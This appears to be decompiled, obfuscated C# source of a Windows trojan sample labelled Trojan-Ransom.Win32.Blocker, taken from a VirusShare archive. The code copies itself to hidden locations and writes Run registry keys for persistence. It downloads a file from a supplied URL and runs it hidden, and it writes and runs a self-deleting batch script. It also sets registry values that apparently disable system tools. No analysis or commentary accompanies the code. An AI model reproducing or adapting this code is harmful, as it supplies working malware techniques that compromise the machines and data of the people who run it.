// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c9120c1babe06550
// MVID: B2F891D4-C201-4F81-8299-D09EACC947CC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan-Ransom.Win32.Blocker.vmj-deff3c9c03fff36f4920a66464fdae29fc17859fa6ac5029198e6b6c0869fdd6.exe

using \u0001;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0003
{
  internal class \u0001
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private Mutex \u0001;

    public void \u0002()
    {
      this.\u0003();
      this.\u0007();
      this.\u0004();
    }

    private void \u0003()
    {
      try
      {
        this.\u0001 = new Mutex(true, \u0004.\u0004.\u0001.\u0003);
        \u0012\u0002.\u007E\u0082\u0002((object) this.\u0001);
      }
      catch
      {
        \u0016\u0002.\u0006\u0002(-1);
      }
    }

    private void \u0004()
    {
      string str1 = \u008E\u0002.\u007E\u0088\u0004((object) \u001D\u0002.\u007E\u0080\u0004((object) \u009D.\u0084\u0004()));
      if (this.\u0002())
        return;
      try
      {
        foreach (string str2 in \u0004.\u0004.\u0001.\u0003)
        {
          if (!\u0004.\u0004.\u0001.\u0003(str2))
            \u0083\u0002.\u007F\u0003(str1, str2);
          \u0018\u0002.\u0082\u0003(str2, FileAttributes.Hidden);
        }
      }
      catch
      {
      }
      try
      {
        \u009F\u0002.\u007E\u0014\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.CurrentUser, \u0003.\u0001.\u0001(96), true), \u0004.\u0004.\u0001.\u0002[0], (object) \u0001\u0003.\u0090((object) '"', (object) \u0004.\u0004.\u0001.\u0003[0], (object) '"'));
        \u009F\u0002.\u007E\u0014\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.LocalMachine, \u0003.\u0001.\u0001(96), true), \u0004.\u0004.\u0001.\u0002[1], (object) \u0001\u0003.\u0090((object) '"', (object) \u0004.\u0004.\u0001.\u0003[1], (object) '"'));
      }
      catch
      {
      }
      try
      {
        \u0012\u0002.\u007E\u0080\u0002((object) this.\u0001);
        foreach (string str3 in \u0004.\u0004.\u0001.\u0003)
        {
          Process process = new Process();
          \u0084\u0002.\u007E\u008E\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), str3);
          \u001F\u0002.\u007E\u008F\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), ProcessWindowStyle.Hidden);
          int num = \u0014\u0003.\u007E\u0086\u0004((object) process) ? 1 : 0;
        }
      }
      catch
      {
      }
      \u0016\u0002.\u0006\u0002(-1);
    }

    public void \u0002([In] string obj0)
    {
      try
      {
        \u0012\u0002.\u007E\u0080\u0002((object) this.\u0001);
      }
      catch
      {
      }
      try
      {
        string str = \u0084\u0003.\u0092(\u0004.\u0004.\u0001.\u0002(\u009E\u0002.\u007E\u0018\u0002((object) new Random(), 5, 12)), \u0003.\u0001.\u0001(157));
        \u0010\u0003.\u0016\u0004((object) new WebClient(), obj0, \u0082\u0003.\u0093(\u0006\u0003.\u000E\u0002(\u0003.\u0001.\u0001(166)), \u0003.\u0001.\u0001(175), str));
        Process process = new Process();
        \u0084\u0002.\u007E\u008E\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), \u0082\u0003.\u0093(\u0006\u0003.\u000E\u0002(\u0003.\u0001.\u0001(166)), \u0003.\u0001.\u0001(175), str));
        \u001F\u0002.\u007E\u008F\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), ProcessWindowStyle.Hidden);
        int num = \u0014\u0003.\u007E\u0086\u0004((object) process) ? 1 : 0;
      }
      catch
      {
      }
      this.\u0006();
      \u0016\u0002.\u0006\u0002(-1);
    }

    public void \u0005()
    {
      try
      {
        \u0084\u0002.\u007E\u0010\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.CurrentUser, \u0003.\u0001.\u0001(96), true), \u0004.\u0004.\u0001.\u0002[0]);
        \u0084\u0002.\u007E\u0010\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.LocalMachine, \u0003.\u0001.\u0001(96), true), \u0004.\u0004.\u0001.\u0002[1]);
      }
      catch
      {
      }
      try
      {
        foreach (string str in \u0004.\u0004.\u0001.\u0003)
          \u008B\u0002.\u0080\u0003(str);
      }
      catch
      {
      }
      this.\u0006();
      \u0016\u0002.\u0006\u0002(-1);
    }

    private bool \u0002()
    {
      string[] strArray = \u0004.\u0004.\u0001.\u0003;
      int index = 0;
      if (index < strArray.Length)
        goto label_3;
label_2:
      return true;
label_3:
      string str = strArray[index];
      if (!\u0004.\u0004.\u0001.\u0003(str))
        return false;
      goto label_2;
    }

    private void \u0006()
    {
      try
      {
        object[] objArray = new object[9]
        {
          (object) \u0003.\u0001.\u0001(180),
          (object) '"',
          (object) \u009A.\u0008\u0002()[0],
          (object) '"',
          (object) \u0003.\u0001.\u0001(193),
          (object) '"',
          (object) \u0006\u0003.\u0086\u0003(\u008E\u0002.\u007E\u0088\u0004((object) \u001D\u0002.\u007E\u0080\u0004((object) \u009D.\u0084\u0004()))),
          (object) '"',
          (object) \u0003.\u0001.\u0001(210)
        };
        string str = \u0005\u0003.\u0091(objArray);
        TextWriter textWriter = (TextWriter) new StreamWriter(\u0084\u0003.\u0092(\u0006\u0003.\u000E\u0002(\u0003.\u0001.\u0001(166)), \u0003.\u0001.\u0001(223)));
        \u0084\u0002.\u007E\u008B\u0003((object) textWriter, str);
        \u0012\u0002.\u007E\u008A\u0003((object) textWriter);
        Process process = new Process();
        \u0084\u0002.\u007E\u008E\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), \u0084\u0003.\u0092(\u0006\u0003.\u000E\u0002(\u0003.\u0001.\u0001(166)), \u0003.\u0001.\u0001(223)));
        \u0098.\u007E\u008D\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), false);
        \u0098.\u007E\u008C\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), true);
        int num = \u0014\u0003.\u007E\u0086\u0004((object) process) ? 1 : 0;
      }
      catch
      {
      }
    }

    private void \u0007()
    {
      try
      {
        \u0008\u0003.\u007E\u0015\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.CurrentUser, \u0003.\u0001.\u0001(240), true), \u0003.\u0001.\u0001(321), (object) \u0003.\u0001.\u0001(330), RegistryValueKind.DWord);
      }
      catch
      {
      }
      if (!\u0004.\u0004.\u0001.\u0015)
        return;
      try
      {
        \u0008\u0003.\u007E\u0015\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.CurrentUser, \u0003.\u0001.\u0001(240), true), \u0003.\u0001.\u0001(335), (object) \u0003.\u0001.\u0001(360), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        \u0008\u0003.\u007E\u0015\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.CurrentUser, \u0003.\u0001.\u0001(365), true), \u0003.\u0001.\u0001(442), (object) \u0003.\u0001.\u0001(360), RegistryValueKind.DWord);
        \u0008\u0003.\u007E\u0015\u0003((object) \u0017\u0003.\u007E\u0011\u0003((object) Registry.LocalMachine, \u0003.\u0001.\u0001(365), true), \u0003.\u0001.\u0001(442), (object) \u0003.\u0001.\u0001(360), RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    static \u0001() => \u0001.\u0004.\u0002(typeof (\u0003.\u0001));
  }
}
